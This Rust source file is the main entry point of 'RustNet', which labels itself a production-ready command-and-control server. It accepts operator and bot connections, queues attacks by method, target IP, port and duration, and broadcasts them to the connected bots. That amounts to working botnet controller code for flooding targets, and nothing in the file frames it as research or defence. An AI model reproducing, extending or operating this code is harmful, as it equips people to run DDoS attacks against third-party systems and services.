// RustNet Server - Production-ready C&C server implementation
mod modules {
    pub mod auth;
    pub mod client_manager;
    pub mod config;
    pub mod error;
    pub mod validation;
    pub mod bot_manager;
    pub mod attack_manager;
    pub mod tls;
    pub mod rate_limiter;
    pub mod state;
    pub mod commands;
    pub mod connection_handler;
    pub mod database;
}

use tokio::net::TcpListener;
use std::sync::Arc;
use std::time::Duration;
use std::net::IpAddr;
use tracing::{info, warn, error, debug};
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};
use dashmap::DashSet;
use sqlx::{SqlitePool, Row};

use modules::auth::{Level, random_string, set_title, LoginAttemptTracker, UserManager};
use modules::database::init_database;
use modules::client_manager::ClientManager;
use modules::config::Config;
use modules::error::{CncError, Result};
use modules::bot_manager::BotManager;
use modules::attack_manager::AttackManager;
use modules::rate_limiter::SimpleRateLimiter;
use modules::tls::setup_tls;
use modules::state::AppState;
use modules::connection_handler::{handle_user_connection, handle_bot_connection};
use modules::commands::{registry::CommandRegistry, impls::register_all};

// Determine config directory - check current dir first, then fallback to executable's parent
fn get_config_dir() -> std::path::PathBuf {
    let current_dir = std::env::current_dir().unwrap_or_default();
    
    // Check if config/ exists in current directory
    let config_in_current = current_dir.join("config");
    if config_in_current.exists() {
        return config_in_current;
    }
    
    // Check if we're in target/release or target/debug - go up to project root
    if current_dir.ends_with("release") || current_dir.ends_with("debug") {
        if let Some(target_dir) = current_dir.parent() {
            if let Some(project_root) = target_dir.parent() {
                let config_path = project_root.join("config");
                if config_path.exists() {
                    return config_path;
                }
            }
        }
    }
    
    // Fallback: create config/ in current directory
    let config_dir = current_dir.join("config");
    std::fs::create_dir_all(&config_dir).ok();
    config_dir
}

const CLEANUP_INTERVAL: Duration = Duration::from_secs(60);
const BOT_TIMEOUT_SECS: i64 = 30;

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    let config = Config::load();
    
    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            std::env::var("RUST_LOG").unwrap_or_else(|_| config.log_level.clone()),
        ))
        .with(tracing_subscriber::fmt::layer())
        .init();

    info!("🦀 RustNet CnC Server v2.0 - Production Ready (Config Update)");
    info!("========================================");
    
    // Determine config directory
    let config_dir = get_config_dir();
    let _bot_tokens_file = config_dir.join("bot_tokens.json");
    info!("📁 Config directory: {}", config_dir.display());
    
    // Validate configuration
    if let Err(e) = config.validate() {
        error!("Configuration validation failed: {}", e);
        return Err(CncError::ConfigError(e));
    }
    info!("[OK] Configuration loaded successfully");

    // Initialize Database
    let db_url = format!("sqlite:{}", config_dir.join("rustnet.db").to_string_lossy());
    info!("Initializing database at {}", db_url);
    let db_pool = init_database(&db_url).await?;
    info!("[OK] Database initialized");
    
    // Setup TLS if enabled
    let tls_acceptor = if config.enable_tls {
        info!("Setting up TLS encryption...");
        // Enforce strict mode if public deployment
        let strict_mode = config.strict_tls || config.deployment_mode == "public";
        
        match setup_tls(&config.cert_path, &config.key_path, strict_mode).await {
            Ok(acceptor) => {
                info!("[OK] TLS encryption enabled");
                Some(Arc::new(acceptor))
            }
            Err(e) => {
                error!("Failed to setup TLS: {}", e);
                error!("TLS is required but setup failed. Server cannot start.");
                return Err(e);
            }
        }
    } else {
        // Config validation ensures we are not in public mode here
        warn!("=================================================================");
        warn!("⚠️  WARNING: TLS IS DISABLED (Local Mode Only)");
        warn!("=================================================================");
        None
    };
    
    // Initialize UserManager
    let user_manager = Arc::new(UserManager::new(db_pool.clone()));

    // Check if root user exists
    if user_manager.get_user("root").await?.is_none() {
        info!("No root user found, creating root user...");
        let password = random_string(16);
        
        match user_manager.add_user(
            "root".to_string(),
            &password,
            chrono::Utc::now() + chrono::Duration::days(40000),
            Level::Owner,
        ).await {
            Ok(_) => {
                warn!("=================================================================");
                warn!("🔐 ROOT ACCOUNT CREATED");
                warn!("Username: root");
                warn!("Password: {}", password);
                warn!("SAVE THIS PASSWORD NOW! IT WILL NOT BE SHOWN AGAIN.");
                warn!("=================================================================");
            },
            Err(e) => error!("Failed to create root user: {}", e),
        }
    }
    
    // Load blacklist and whitelist
    let blacklist = match load_ip_list(&db_pool, "blacklist").await {
        Ok(list) => list,
        Err(e) => {
            error!("Failed to load blacklist: {}", e);
            return Err(e);
        }
    };
    let whitelist = match load_ip_list(&db_pool, "whitelist").await {
        Ok(list) => list,
        Err(e) => {
            error!("Failed to load whitelist: {}", e);
            return Err(e);
        }
    };
    info!("Loaded {} blacklisted IPs and {} whitelisted IPs", blacklist.len(), whitelist.len());

    // Initialize managers
    let state = Arc::new(AppState::new(
        config.clone(),
        Arc::new(BotManager::new(config.max_bot_connections, db_pool.clone())),
        Arc::new(ClientManager::new(config.max_user_connections)),
        Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs, db_pool.clone())),
        Arc::new(SimpleRateLimiter::new(db_pool.clone(), config.rate_limit_per_minute as usize)),
        user_manager,
        tls_acceptor,
        db_pool.clone(),
        Arc::new(LoginAttemptTracker::new(db_pool.clone())),
        whitelist,
        blacklist,
    ));

    // Initialize Command Registry
    let mut registry = CommandRegistry::new();
    register_all(&mut registry);
    let registry = Arc::new(registry);
    
    // Cleanup stale attacks from previous run
    state.attack_manager.cleanup_stale_attacks().await;
    
    // Start periodic cleanup task
    let state_clone = state.clone();
    tokio::spawn(async move {
        periodic_cleanup(state_clone).await;
    });

    // Start telemetry flush task (High frequency)
    let state_clone = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(5));
        loop {
            interval.tick().await;
            state_clone.bot_manager.flush_telemetry().await;
        }
    });
    
    // Start CnC server
    info!("🌐 Starting User server on {}:{}", config.user_server_ip, config.user_server_port);
    let user_listener = TcpListener::bind(format!("{}:{}", config.user_server_ip, config.user_server_port)).await?;
    
    // Start bot server
    info!("🤖 Starting Bot server on {}:{}", config.bot_server_ip, config.bot_server_port);
    let bot_listener = TcpListener::bind(format!("{}:{}", config.bot_server_ip, config.bot_server_port)).await?;
    
    info!("✓ All servers started successfully");
    info!("========================================");
    
    // Setup graceful shutdown
    let shutdown = async {
        match tokio::signal::ctrl_c().await {
            Ok(()) => {},
            Err(e) => error!("Failed to listen for shutdown signal: {}", e),
        }
    };
    tokio::pin!(shutdown);
    
    // Spawn title updater
    let state_clone = state.clone();
    let title_task = tokio::spawn(async move {
        update_titles(state_clone).await;
    });
    
    // Start queue processor
    let state_clone = state.clone();
    tokio::spawn(async move {
        loop {
            // Process all available items
            while let Some(request) = state_clone.attack_manager.process_queue().await {
                match state_clone.attack_manager.start_attack(
                    request.method.clone(),
                    request.ip,
                    request.port,
                    request.duration_secs,
                    request.username.clone(),
                    request.user_level,
                    request.bot_count
                ).await {
                    Ok(id) => {
                        info!("Started queued attack {} for user {}", id, request.username);
                        state_clone.bot_manager.broadcast_attack(id, &request.method, &request.ip.to_string(), request.port, request.duration_secs).await;
                    }
                    Err(e) => {
                        warn!("Failed to start queued attack: {}", e);
                    }
                }
            }
            // Wait for notification
            state_clone.attack_manager.wait_for_queue().await;
        }
    });
    
    // User connection handler
    let state_clone = state.clone();
    let registry_clone = registry.clone();
    let user_task = tokio::spawn(async move {
        loop {
            match user_listener.accept().await {
                Ok((conn, addr)) => {
                    info!("👤 User connection from {}", addr);
                    let state = state_clone.clone();
                    let registry = registry_clone.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_user_connection(conn, addr.to_string(), state, registry).await {
                            error!("User connection error: {}", e);
                        }
                    });
                }
                Err(e) => error!("Error accepting user connection: {}", e),
            }
        }
    });
    
    // Bot connection handler
    let state_clone = state.clone();
    let bot_task = tokio::spawn(async move {
        loop {
            match bot_listener.accept().await {
                Ok((conn, addr)) => {
                    info!("🤖 Bot connection from {}", addr);
                    let state = state_clone.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_bot_connection(conn, addr, state).await {
                            error!("Bot connection error: {}", e);
                        }
                    });
                }
                Err(e) => error!("Error accepting bot connection: {}", e),
            }
        }
    });
    
    // Wait for shutdown signal
    tokio::select! {
        _ = shutdown => {
            info!("🛑 Shutdown signal received, gracefully shutting down...");
            
            // Cancel background tasks
            title_task.abort();
        }
        _ = user_task => {
            error!("User server task terminated unexpectedly");
        }
        _ = bot_task => {
            error!("Bot server task terminated unexpectedly");
        }
    }
    
    // Perform cleanup
    info!("📊 Final statistics:");
    info!("   Bots: {}", state.bot_manager.get_bot_count().await);
    info!("   Clients: {}", state.client_manager.get_client_count().await);
    info!("   Active attacks: {}", state.attack_manager.get_active_count().await);
    
    info!("✓ Server shutdown complete");
    
    Ok(())
}

async fn periodic_cleanup(state: Arc<AppState>) {
    let mut interval = tokio::time::interval(CLEANUP_INTERVAL);
    
    loop {
        interval.tick().await;
        
        // Telemetry is flushed in a separate task now

        // Cleanup finished attacks
        state.attack_manager.cleanup_finished().await;
        
        // Cleanup dead bots
        state.bot_manager.cleanup_dead_bots(BOT_TIMEOUT_SECS).await;
        
        // Cleanup inactive client sessions
        state.client_manager.cleanup_inactive(state.config.read().await.session_timeout_secs).await;
        
        // Cleanup old rate limit entries
        state.rate_limiter.cleanup_old_entries().await;
        
        // Cleanup old login attempts
        state.login_tracker.cleanup_old_attempts().await;
        
        let bot_count = state.bot_manager.get_bot_count().await;
        let client_count = state.client_manager.get_client_count().await;
        let attack_count = state.attack_manager.get_active_count().await;
        
        debug!("Cleanup: {} bots, {} clients, {} attacks", bot_count, client_count, attack_count);
    }
}

async fn update_titles(state: Arc<AppState>) {
    let spin_chars = ['∴', '∵'];
    let mut spin_index = 0;
    
    loop {
        tokio::time::sleep(Duration::from_secs(2)).await;
        
        let clients = state.client_manager.get_all_clients().await;
        let bot_count = state.bot_manager.get_bot_count().await;
        let attack_count = state.attack_manager.get_active_count().await;
        
        for client in clients {
            let title = format!(
                "    [{}]  Servers: {} | Attacks: {}/{} |  ☾☼☽  | User: {} ({}) [{}]",
                spin_chars[spin_index],
                bot_count,
                attack_count,
                state.config.read().await.max_attacks,
                client.user.username,
                client.user.get_level().to_str(),
                spin_chars[spin_index]
            );
            
            let title_seq = set_title(&title);
            let _ = client.try_write(title_seq.as_bytes()).await;
        }
        
        spin_index = (spin_index + 1) % spin_chars.len();
    }
}

async fn load_ip_list(pool: &SqlitePool, table: &str) -> Result<DashSet<IpAddr>> {
    let set = DashSet::new();
    let query = format!("SELECT ip FROM {}", table);
    let rows = sqlx::query(&query).fetch_all(pool).await.map_err(|e| CncError::DatabaseError(e))?;
    for row in rows {
        if let Ok(ip_str) = row.try_get::<String, _>("ip") {
            if let Ok(ip) = ip_str.parse::<IpAddr>() {
                set.insert(ip);
            }
        }
    }
    Ok(set)
}
